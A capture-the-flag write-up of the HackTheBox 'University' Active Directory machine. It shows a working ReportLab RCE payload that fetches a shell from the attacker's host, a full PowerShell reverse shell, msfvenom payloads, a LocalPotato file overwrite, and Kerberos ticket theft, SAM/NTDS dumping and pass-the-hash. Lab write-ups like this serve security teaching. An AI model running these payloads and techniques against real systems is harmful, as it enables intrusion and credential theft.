---
title:  "University (Insane)"
seo_title: "Writeup for the HackTheBox University Machine"
date:   2024-08-15T15:00
categories: ['HackTheBox', 'Active-Directory', 'Windows']
---

![](/assets/images/headers/University.png)

## Synopsis
University is an Insane Windows Active Directory machine that starts with a university webpage. The web application allows exporting user profile pages to a PDF using `xhtml2pdf`, which is vulnerable to a Remote Code Execution vulnerability via [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/CVE-2023-33733). This allows getting initial access to the machine. Subsequently, the account of a professor is compromised using a forged certificate. With the professor's account, a malicious archive file is uploaded to exploit [CVE-2023-36025](https://nvd.nist.gov/vuln/detail/CVE-2023-36025), which allows getting Remote Code Execution as the user who extracts the archive. A relay attack is then meticulously set up to perform an unconstrained delegation attack. On the newly compromised computer, the Kerberos ticket for a new user is extracted, enabling the reading of the password of a group-managed service account. This account can impersonate the domain Administrator, thus compromising the entire environment.

## Enumeration
First thing we do is sign up for an account on the `university.htb` site. While that’s cooking in the background, we’re also multitasking like it’s finals week by running kerbrute to find some valid users in the domain.

```console
$ kerbrute userenum -d university.htb --dc 10.10.11.39 james.m-x142844.txt

2024/12/22 13:32:36 >  Using KDC(s):
2024/12/22 13:32:36 >   10.10.11.39:88

2024/12/22 13:32:36 >  [+] VALID USERNAME:   william.b@university.htb
2024/12/22 13:32:36 >  [+] VALID USERNAME:   john.d@university.htb
2024/12/22 13:32:37 >  [+] VALID USERNAME:   steven.p@university.htb
...
2024/12/22 13:35:40 >  [+] VALID USERNAME:   kai.k@university.htb
```

We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we peep this feature that lets you request a signed certificate. The site hits us with:

```
You can use it for login without need for credentials, deleting your account and uploading new lectures(for professors only).
```

Bro... that’s basically giving users a get-in-free wristband. Let’s test it. We make a Certificate Signing Request (CSR) with openssl:

```console
$ openssl req -newkey rsa:2048 -keyout PK.key -out bashee.csr
Enter PEM pass phrase:1234
Verifying - Enter PEM pass phrase:1234
<SNIP>
Common Name (e.g. server FQDN or YOUR name) []:bashee
Email Address []:bashee@university.htb
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Key things here:
- Common Name (CN) = your username on the site
- Email = same one you registered with
- Everything else = filler

Upload the CSR, the site signs it, and you get a key you can use to log in without a password. Cute feature, but we can only sign certs for our account... so no professor impersonation yet.

Doing some clickety-click enumeration, we find a staff profile page at `http://university.htb/accounts/profile/visit/2/`:

```
Username: george
Email: george@university.htb
First name: george
Last Name: lantern
Address: Canada West - Vancouver
Department: Information Systems Security
```

Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says “nah fam” if we try to sign a cert for anyone we’re not logged in as. So for now — we’re locked to our own account cert. We ball later.

## Foothold
So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ `Export Profile to PDF` feature. Being the nosy menace I am, I yeet that file into exiftool like:

```console
$ exiftool profile.pdf
```

Boom — ReportLab shows up in the metadata like "hey bestie, wanna pwn me!". Turns out, ReportLab has [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733), a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:

```html
<para>
<font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl -o shell.ps1 http://10.10.14.65:8000/shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font>
</para>
```

Translation: curl my PowerShell reverse shell from my attacker box. Then I run a Python webserver on port 8000 to serve the goods, which downloads our [PowerShell reverse shell](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3).

```html
<para>
<font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font>
</para>
```

Meanwhile, I’m also running netcat and get a callback as the domain user `university\wao`.

```console
$ sudo nc -nlvp 443           
Listening on 0.0.0.0 443
Connection received on 10.10.11.39 60637

PS C:\Web\University> whoami
university\wao
```

## User
I’m chilling in my fresh shell as `university\wao`, feeling like I just unlocked a secret character skin, when I peep my group memberships... Remote Management Users. So if I can snag this user’s password, I get to WinRM my way in like it’s the VIP lounge at cyberclub.

So I start creeping around the filesystem like a raccoon on a 3 AM 7-Eleven snack run, nosing in everything, praying for leftover pizza crusts (aka plaintext creds). And what do I stumble on? A folder literally named `C:\Web\DB Backup`. Yeah... they really put “Backup” in the name and thought I wouldn’t look.

Inside, I find a PowerShell script called `db-backup-automator.ps1`. And let me tell you — the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.

```powershell
PS C:\Web\DB Backups> cat db-backup-automator.ps1
cat db-backup-automator.ps1
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"

Invoke-Expression -Command $7zCommand
```

So I crack open `db-backup-automator.ps1` and, surprise surprise, it’s doing a little "backup the DB and encrypt it" routine — but the password it’s using? Bruh. It's giving lazy dev energy. The script's password is basically `WebAO1337`, and since my user is WAO, the math is mathing. I spit those creds into WinRM:

```console
$ evil-winrm -i 10.10.11.39 -u 'wao' -p 'WebAO1337'
```

And now I’m just sitting here like, pls work, because if it does, we’re about to upgrade from "sneaking in through the bathroom window" to "walking in through the front door with main character energy."

```console
*Evil-WinRM* PS C:\Web\University> download db.sqlite3
```

Pulled the `db.sqlite3` straight off the server with Evil-WinRM — feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations. 

```sql
sqlite> select id,username,password,csr,user_type from University_customuser;

2|george|pbkdf2_sha256$600000$igb7CzR3ivxQT4urvx0lWw$dAfkiIa438POS8K8s2dRNLy2BKZv7jxDnVuXqbZ61+s=||Professor
3|carolpbkdf2_sha256$600000$i8XRGybY2ASqA3kEuTW4XH$SwK7A52nA1KOnuniKifqWzrjiIyOnrZu7sf+Zvq44qc=||Professor
4|Nour|pbkdf2_sha256$600000$Bg8pRHaZsbGpLwirrZPvvn$7CtXYJhBDrGhiCvjma7X/AOKRWZS2SP0H6PAXvT96Vw=||Professor
5|martin.rose|pbkdf2_sha256$600000$VzP8VVjEQgQw6HvYAftmCl$s9k3UC/e2++hhQDF2KzhunOaAqxbi4rugRb42dC6qr0=||Professor
6|nya|pbkdf2_sha256$600000$1s48WhgRDulQ6FsNgnXjot$SZ4piS9Ryf4mgIj0prEjN+F0pGEDtNti3b9WaQfAeTk=|static/assets/uploads/CSRs/6_mnY36oU.csr|Professor
7|Steven.U|pbkdf2_sha256$600000$70XtdR4HrHHignt7EHiOpT$RP9/4PKHmbtCBq0FOPqyppQKjXntM89vc7jGyjk/zAk=|static/assets/uploads/CSRs/7.csr|Student
```

Most of it is pretty mid... until I spot professor Nya’s CSR sitting there all cute. Little endpoint fuzzing later and now I’ve also yoinked `martin.rose`’s CSR at `http://university.htb/static/assets/uploads/CSRs/5.csr`.

```console
*Evil-WinRM* PS C:\Web\University\CA> dir

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/15/2024   5:51 AM           1399 rootCA.crt                                                            
-a----        2/15/2024   5:48 AM           1704 rootCA.key                                                            
-a----       12/22/2024  12:16 PM             42 rootCA.srl
```

Since we've basically got the keys to the kingdom (rootCA cert + key from the server), I whip up a professor cert for Martin like I'm running my own shady university IT department. Openssl be like “Certificate request self-signature ok” — yeah, it better be.

```console
$ openssl x509 -req -in 5.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial

Certificate request self-signature ok
subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = martin.rose, emailAddress = martin.rose@hotmail.com
-----BEGIN CERTIFICATE-----
MIIDiDCCAnACFAnHyzdMyxB5iESwk+CesiDIkfZUMA0GCSqGSIb3DQEBCwUAMH0x
CzAJBgNVBAYTAlVLMRMwEQYDVQQIDApTb21lLVN0YXRlMRcwFQYDVQQKDA5Vbml2
ZXJzaXR5IEx0ZDEXMBUGA1UEAwwOdW5pdmVyc2l0eS5odGIxJzAlBgkqhkiG9w0B
CQEWGGhlYWRhZG1pbkB1bml2ZXJzaXR5Lmh0YjAeFw0yNDEyMjIxNDE4NDFaFw0y
NTAxMjExNDE4NDFaMIGDMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0
ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMRQwEgYDVQQDDAtt
YXJ0aW4ucm9zZTEmMCQGCSqGSIb3DQEJARYXbWFydGluLnJvc2VAaG90bWFpbC5j
b20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDaICIYiWqNnf96BDs0
Uu+dt2+AGrfBLJ2M1YRqW7QERj5i2CWCGWgZqoQFLd7RSJFsBmtMMhhaHR+hNoD6
odjTuhPcEbDxUkdAXAY9yqGpzFcy69+Cuv5gDoDUcQoDAIggdS4mRe50j6Gsdx4n
y+vdLAfXEcKszErBdMrmF9f9bj3YP1qwfnXw4BiL82xWk1FV74DRxoQauFuZTkFJ
QbS3/FIA/R2oLvbmcPDXezKG6phb2e6lplbSsAXnDU8xwFLvrd9K2WsB6dvQxk+o
wn09IXmiI1g8j4UFgP5GzUMOirmn8nlj93H8QK/exmLMIlgZb9DWg2uBNO9yMSXY
epZVAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACu3wfyYax3hazAA2wAzD48S1X8G
Vb2l5GFL7ZdK2xniJbmUnXw3jhqUDcyVQGHfKUDXO5ZgViHiaX+mHpKh7KaYJDll
LhrbaGrzOxZncsKHt+UM7yHYsnPZoWH+VfoCQqwKylZIHinuPWPsNgIkSGF0/tae
/SXdZRIPQrbrTqMEvtQ2PCes6nGVTeLo+0oSB7jRO8+Ur6rEMDstGLVOEKVZreRs
MN2k4hq7lST6Xr82Zs9iSwlAwsKa4aYrkAxaVptgyXcUdKD4xbk+Wde8cdA3mV/b
cJxT1hFdCYlYZ1chHGSU6yRArmoGiIOjM/19yDhzjiRyd8MeosIl2Vq/czA=
-----END CERTIFICATE-----
```

![](/assets/images/writeups/university/lecture-upload.png)

Professors can upload lectures, but the files need to be signed. Cool, so I spin up a GPG key for our fake professor and decide to get messy with it.

```console
$ gpg --gen-key

Real name: martin.rose
Email address: martin.rose@hotmail.com
You selected this USER-ID:
    "martin.rose <martin.rose@hotmail.com>"

$ gpg --export -a "martin.rose" > GPG-public-key.asc
```
Since this machine has not been updated for some time, we can suspect it being vulnerable to [CVE-2023-36025](https://github.com/ka7ana/CVE-2023-36025). So I cook up the most suspicious shortcut of all time: drop a batch file on `C:\Windows\Temp`, yeet a `.url` link to it inside a ZIP, slap a signature on it like I’m forging hall passes, and then upload it for the Content Evaluators like, “hey bestie, pls click my totally legit file ❤️.”

```console
$ cat link.url 
[InternetShortcut]
URL=file://C:/Windows/Temp/shell.bat
$ msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.65 lport=1337 > rev.bat

$ zip Lecture.zip link.url
$ gpg -u "martin.rose" --detach-sign Lecture.zip
```

Except... crickets. No callback. Alright, pivot time. Ping sweep the `192.168.99.0/24` subnet, find `WS-3` and `LAB-2` just chilling. Fire up [Ligolo-ng](https://github.com/nicocha30/ligolo-ng), proxy up, route the subnet, and remote into `WS-3` like it’s my side chick.

```console
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ ./proxy -selfcert -laddr 0.0.0.0:11601 

PS C:\Windows\Temp> ./agent.exe -connect 10.10.14.65:11601 -ignore-cert

$ sudo ip route add 192.168.99.0/24 dev ligolo
$ evil-winrm -i 192.168.99.2 -u 'wao' -p 'WebAO1337'
```

We can also SSH into LAB-2 with WAO’s creds and immediately `sudo su` into root — easiest W of my life.

```console
$ ssh wao@192.168.99.12
wao@192.168.99.12's password: WebAO1337

$ sudo su
root@LAB-2:#
```

Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if `WS-3` does the heavy lifting?” energy. The idea: if a file gets opened from `WS-3`, we can make it point straight to `LAB-2` and skip all the drama. So I tweak my reverse shell to target `LAB-2`'s IP (192.168.99.12) instead:

```console
$ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.99.12 lport=1337 > rev.bat

*Evil-WinRM* PS C:\Windows\Temp> hostname
WS-3
*Evil-WinRM* PS C:\Windows\Temp> upload shell.bat
```

Now the plan is simple: craft the `.url` file so it points at that batch file living on `WS-3`. As soon as some unsuspecting professor/admin clicks the shortcut, `WS-3` will execute it, and boom — the callback will land right in `LAB-2`’s waiting arms.

```console
root@LAB-2:# nc -nlvp 1337
Listening on [0.0.0.0]
Connection from 192.168.99.2 59755 received!

C:\Users\Martin.T\Desktop>type README.txt

Hello Professors.
We have created this note for all the users on the domain computers: WS-1, WS-2 and WS-3.
These computers have not been updated since 10/29/2023.
Since these devices are used for content evaluation purposes, they should always have the latest security updates.
So please be sure to complete your current assessments and move on to the computers "WS-4" and "WS-5".
The security team will begin working on the updates and applying new security policies early next month.
Best regards.
Help Desk team - Rose Lanosta.
```

## Root
Right — now that we’ve got `Martin.T` on `WS-3`, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called [LocalPotato](https://github.com/decoder-it/LocalPotato) (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let's look for things that seem worthwhile.

One file at `C:\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1` seems to be an automated cleanup script. If this script runs with higher privileges (scheduled task, service, or startup script), swapping it out for our payload means the next time it runs, we get a SYSTEM or admin shell.

We will create the following `shell.ps1` reverse shell script and then upload it to `WS-3`:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.99.12',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex ". { $data } 2>&1" | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Now we perform the Potato exploit and start a new netcat listener on `LAB-2`.

```powershell
C:\tmp> .\potato.exe -i C:\tmp\shell.ps1 -o "\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1"
.\potato.exe -i C:\tmp\shell.ps1 -o "Program Files\Automation-Scripts\wpad-cache-cleaner.ps1"

     LocalPotato (aka CVE-2023-21746 & HTTP/WebDAV) 
     by splinter_code & decoder_it

[*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAAC/ZTEHh2lnXwwz8QljdkPFAbQAADQMEA/tQveHVe57FisAFQAHAFcAUwAtADMAAAAHADEAOQAyAC4AMQA2ADgALgA5ADkALgAyAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:
[*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
[*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
[*] Received DCOM NTLM type 1 authentication from the privileged client
[*] Connected to the SMB server with ip 127.0.0.1 and port 445
[+] SMB Client Auth Context swapped with SYSTEM 
[+] RPC Server Auth Context swapped with the Current User
[*] Received DCOM NTLM type 3 authentication from the privileged client
[+] SMB reflected DCOM authentication succeeded!
[+] SMB Connect Tree: \\127.0.0.1\c$  success
[+] SMB Create Request File: Program Files\Automation-Scripts\wpad-cache-cleaner.ps1 success
[+] SMB Write Request file: Program Files\Automation-Scripts\wpad-cache-cleaner.ps1 success
[+] SMB Close File success
[+] SMB Tree Disconnect success
```

Boom — potato’s baked and served. After sitting there like a sniper in the bushes for ~10+ minutes, the task finally ran and called our reverse shell.

```console
root@LAB-2:/# sudo nc -nvlp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from 192.168.99.2 59755 received!

PS C:\Windows\system32> whoami
ws-3\administrator
```

That’s full local admin on `WS-3`. Now there are several ways to get the root flag. 

### Method 1
Ok so first move — dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot — Rose's TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with `/ptt`.

```powershell
PS C:\tmp> .\Rubeus.exe dump /nowrap

ServiceName              :  krbtgt/UNIVERSITY.HTB
    ServiceRealm             :  UNIVERSITY.HTB
    UserName                 :  Rose.L
    UserRealm                :  UNIVERSITY.HTB
    StartTime                :  12/23/2024 11:13:06 AM
    EndTime                  :  12/23/2024 9:11:36 PM
    RenewTill                :  12/30/2024 11:11:36 AM
    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  yyPBB4KJQdaFY9q/6OOMETkXrf+1N+q4gORS/lQtpME=
    Base64EncodedTicket      : <ROSE_BASE64_TICKET>

PS C:\tmp> .\Rubeus.exe renew /ticket:<ROSE_BASE64_TICKET> /ptt /nowrap
```

Quick klist check and boom, we’re literally her now.

```console
PS C:\tmp> klist

Current LogonId is 0:0x3e7
Cached Tickets: (2)

#0> Client: Rose.L @ UNIVERSITY.HTB
    Server: krbtgt/UNIVERSITY.HTB @ UNIVERSITY.HTB
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
    Start Time: 12/23/2024 11:26:13 (local)
    End Time:   12/23/2024 21:24:43 (local)
    Renew Time: 12/30/2024 11:21:36 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x1 -> PRIMARY 
    Kdc Called: 

```

From BloodHound we see Rose has ReadGMSAPassword rights on the GMSA-PClient01$ account. That’s spicy because that means we can read the machine account password and escalate to Domain Admin with an RBCD attack.

![](/assets/images/writeups/university/BH.png)

Drop `GMSAPasswordReader.exe`, tell it to target "GMSA-PClient01$", and it hands over every hash flavor — RC4, AES128, AES256, DES. The RC4 hash is all we need for the next step.

```console
PS C:\tmp> .\GMSAPasswordReader.exe --AccountName "GMSA-PCLIENT01$"
Calculating hashes for Old Value
[*] Input username             : GMSA-PClient01$
[*] Input domain               : UNIVERSITY.HTB
[*] Salt                       : UNIVERSITY.HTBGMSA-PClient01$
[*]       rc4_hmac             : FD089A6CE20FD923CDE921AB727081F7
[*]       aes128_cts_hmac_sha1 : 8D212E250E2F93327E6BFFFB1F6B84FF
[*]       aes256_cts_hmac_sha1 : D54377CF68DFFED662689735661C22EA34D8DDCD630A93B0A566A64950C67C3D
[*]       des_cbc_md5          : 15E515D5CE9D0D7C

Calculating hashes for Current Value
[*] Input username             : GMSA-PClient01$
[*] Input domain               : UNIVERSITY.HTB
[*] Salt                       : UNIVERSITY.HTBGMSA-PClient01$
[*]       rc4_hmac             : 0D333F335FDA7915C9B62D37056351C6
[*]       aes128_cts_hmac_sha1 : B2292EB7C52C682DCDF4C7F36E339461
[*]       aes256_cts_hmac_sha1 : E671040580E4C9A3924F32527A231D0A640F9B02612A768DECC6111F3BA7100F
[*]       des_cbc_md5          : FB7F0DF2EACE5E76
```

Since `GMSA-PClient01$` is `AllowedToAct` on the DC, we use Rubeus S4U to impersonate the administrator, requesting a service ticket for CIFS and WinRM on the DC. We inject that ticket, klist again, and it straight up says `Client: administrator @ UNIVERSITY.HTB`. Thats root baby!

```console
PS C:\tmp> .\Rubeus.exe s4u /user:GMSA-PCLIENT01$ /rc4:0D333F335FDA7915C9B62D37056351C6 /impersonateuser:administrator /msdsspn:cifs/DC.university.htb /altservice:winrm /ptt

PS C:\tmp> klist

Current LogonId is 0:0x3e7
Cached Tickets: (1)

#0> Client: administrator @ UNIVERSITY.HTB
    Server: cifs/DC.university.htb @ UNIVERSITY.HTB
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
    Start Time: 12/23/2024 11:38:39 (local)
    End Time:   12/23/2024 21:38:37 (local)
    Renew Time: 12/30/2024 11:38:37 (local)
    Session Key Type: AES-128-CTS-HMAC-SHA1-96
    Cache Flags: 0 
    Kdc Called:

PS C:\tmp> type \\dc.university.htb\c$\users\Administrator\Desktop\root.txt
<REDACTED>
```

### Method 2
Another option we have is to dump the SAM database (download it with session in Evil-WinRM). Then we run `secretsdump.py` to to spit out every hash in the system, including the golden ticket: a default password chilling in plaintext.

```console
C:\tmp> hostname
WS-3
C:\tmp> reg.exe save hklm\sam SAM
The operation completed successfully.
C:\tmp> reg.exe save hklm\system SYSTEM
The operation completed successfully.
C:\tmp> reg.exe save hklm\security SECURITY
The operation completed successfully.

$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xcafb76872642f6bc09dd9e17ae7cddec
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba76a28db8aaeb636566a414f3e104aa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:71ffc7b2d302f8059b92219e7d7a7ba1:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:a8bf1bae201f988dc1ca99f1043e11dc:::

<SNIP>

[*] DefaultPassword 
(Unknown User):v3ryS0l!dP@sswd#X
[*] Cleaning up...
```

We see `v3ryS0l!dP@sswd#X` and think: ohhh this is too easy. Password spraying time.

```console
$ nxc smb 10.10.11.39 -u ad_users.txt -p 'v3ryS0l!dP@sswd#X' --continue-on-success
```

Run it against `ad_users.txt` with NetExec, and guess what? `Brose.W` is just waiting there with the same password, Backup Operators group, ripe for some NTDS shadow-copy shenanigans.

![](/assets/images/writeups/university/BH-brose.w.png)

We fire up Evil-WinRM as Brose.W, drop diskshadow `.dsh` script, spin up a shadow copy, robocopy the NTDS.dit like it’s Hot Wheels. Download them, feed them to `secretsdump.py`, and it’s raining domain hashes.

```console
$ evil-winrm -i 10.10.11.39 -u 'university.htb\brose.w' -p 'v3ryS0l!dP@sswd#X'

*Evil-WinRM* PS C:\Users\Brose.W\Documents> cat vss.dsh
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:

*Evil-WinRM* PS C:\Users\Brose.W\Documents> diskshadow /s C:\Users\Brose.W\Documents\vss.dsh

The shadow copy was successfully exposed as z:\.

*Evil-WinRM* PS C:\Users\Brose.W\Documents> robocopy /B Z:\Windows\NTDS .\ntds.dit
*Evil-WinRM* PS C:\Users\Brose.W\Documents> ls
    Directory: C:\Users\Brose.W\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/23/2024   3:01 AM       16777216 ntds.dit
-a----       12/23/2024   1:14 PM            134 vss.dsh

*Evil-WinRM* PS C:\Users\Brose.W\Documents> download ntds.dit
*Evil-WinRM* PS C:\Users\Brose.W\Documents> reg save HKLM\SYSTEM SYSTEM.SAV
*Evil-WinRM* PS C:\Users\Brose.W\Documents> download SYSTEM.SAV

$ secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x7704a47762a8cd07d2922fc3e97e02a4
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 53baa9d0678f975750cdfcfc8b9e6f42
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e63413bab01a0b8820983496c0be3a9a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:2522eb84c83b5e9ffde18045be5b9e59:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c4599e48661690fa6538fe96d366de:::

<SNIP>
```

Final move? We got the Administrator hash in our hands, meaning it is Pass-the-Hash time. We SMB to the DC, grab root.txt, sit back, sip whatever beverage hackers sip while the domain collapses in slow motion.

```console
$ nxc smb 10.10.11.39 -u 'Administrator' -H 'e63413bab01a0b8820983496c0be3a9a' -x 'cat C:\Users\Administrator\Desktop\root.txt'
```

Boom. University.HTB? Ours. Every ticket stolen, every hash cracked, every default password abused. The network? Toast. The flags? Collected. The lesson? One tiny slip in AD, one exposed secret, and the kingdom crumbles. Chaos achieved, mission complete.